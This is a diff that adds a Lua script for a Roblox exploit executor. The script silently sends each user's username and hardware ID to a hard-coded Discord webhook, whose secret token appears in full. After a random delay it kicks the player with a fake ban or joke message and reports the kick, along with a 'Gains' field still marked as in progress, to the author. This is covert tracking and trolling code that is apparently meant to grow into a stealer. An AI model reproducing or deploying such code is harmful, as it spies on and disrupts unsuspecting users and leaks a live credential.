@@ -1,0 +1,140 @@
+--/// Shit You can change
+local minimumtime = 10 -- in seconds
+local maximumtime = 15 -- in seconds
+Webhook_URL = "https://discord.com/api/webhooks/1084344739043741796/oYB3V3dkFDIutTN_i2L_N2uwBo6nq1IHuYCBwEmTZoBzjmzO3C7jKNrip2uvJY1kyzAM"
+---\\\ End of shit you can change
+
+
+local TIME_ZONE = 0
+
+local date = os.date("!*t")
+local hour = (date.hour + TIME_ZONE) % 24
+local ampm = hour < 12 and "AM" or "PM"
+local timestamp = string.format("%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, ampm)
+
+
+local plr = game.Players.LocalPlayer
+local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+HttpService = game:GetService("HttpService")
+local blacklist = {
+    
+}
+
+if table.find(blacklist, hwid) then
+    print("ruhroh")
+    plr:Kick("You have been blacklisted from all egg head scripts  (rip bozo)")
+    local onexec = syn.request(
+	{
+		Url = Webhook_URL,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = 'application/json'
+		},
+		Body = HttpService:JSONEncode({
+			["content"] = "",
+			["embeds"] = {{
+				["title"] = "The script was executed by a blacklisted user",
+				["description"] = plr.Name.." Executed the script at "..timestamp,
+				["type"] = "rich",
+				["color"] = tonumber(0x660000),
+				["fields"] = {
+					{
+						["name"] = "Hardware ID:",
+						["value"] = hwid,
+						["inline"] = true
+					}
+	
+				}
+			}}
+		})
+	}
+)
+
+    else
+        local onexec = syn.request(
+	{
+		Url = Webhook_URL,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = 'application/json'
+		},
+		Body = HttpService:JSONEncode({
+			["content"] = "",
+			["embeds"] = {{
+				["title"] = "The script was executed",
+				["description"] = plr.Name.." Executed the script",
+				["type"] = "rich",
+				["color"] = tonumber(0x76ff76),
+				["fields"] = {
+					{
+						["name"] = "Hardware ID:",
+						["value"] = hwid,
+						["inline"] = true
+					}
+	
+				}
+			}}
+		})
+	}
+)
+
+end
+print("Hiya")
+
+
+
+
+
+local messages = {
+	"You have been banned from the game.",
+	
+	"Hi how are ya",
+	
+	"egg head on top FR FR!!!",
+	
+	"Jou Ohn joined your server, I saved your ass.",
+	
+	"Is this an on god or a fr moment?",
+	
+	"I might make a game soon, who knows.",
+
+    "Classroom of the elite is a good light novel, you should read it."
+	
+
+
+}
+local Rand = Random.new()
+if not  table.find(blacklist, hwid) then
+    wait(Rand:NextNumber(minimumtime,maximumtime))
+plr:Kick(messages[math.random(1, #messages)])
+local response = syn.request(
+	{
+		Url = Webhook_URL,
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = 'application/json'
+		},
+		Body = HttpService:JSONEncode({
+			["content"] = "",
+			["embeds"] = {{
+				["title"] = "Your account has been kicked",
+				["description"] = plr.Name.." Was kicked. The gains are as listed below.",
+				["type"] = "rich",
+				["color"] = tonumber(0xffffff),
+				["fields"] = {
+					{
+						["name"] = "Hardware ID:",
+						["value"] = hwid,
+						["inline"] = true
+					},
+					{
+					    ["name"] = "Gains:",
+						["value"] = "Working on this feature :)",
+						["inline"] = false
+					}
+				}
+			}}
+		})
+	}
+)
+end
